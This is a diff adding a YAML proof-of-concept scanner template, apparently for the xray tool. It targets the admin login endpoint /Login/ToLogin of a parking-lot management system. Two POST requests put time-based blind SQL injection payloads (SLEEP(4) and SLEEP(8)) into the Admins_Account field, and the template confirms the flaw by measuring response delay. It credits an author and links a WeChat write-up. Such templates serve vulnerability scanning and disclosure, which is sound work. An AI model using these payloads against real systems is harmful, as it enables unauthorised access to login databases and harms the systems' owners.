@@ -1,0 +1,31 @@
+name: poc-yaml-tingchechang-ToLogin-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Login/ToLogin
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: |
+       Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(4)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /Login/ToLogin
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: |
+       Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(8)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486567&idx=1&sn=a25adfb68fac33e071b9640b2fb62c3b&chksm=c267b954f5103042f7025ba8c8ee4ce5d193e2eeba4fcae34e9f43f89c074f348f7b2b0ff030&token=1628549949&lang=zh_CN#rd
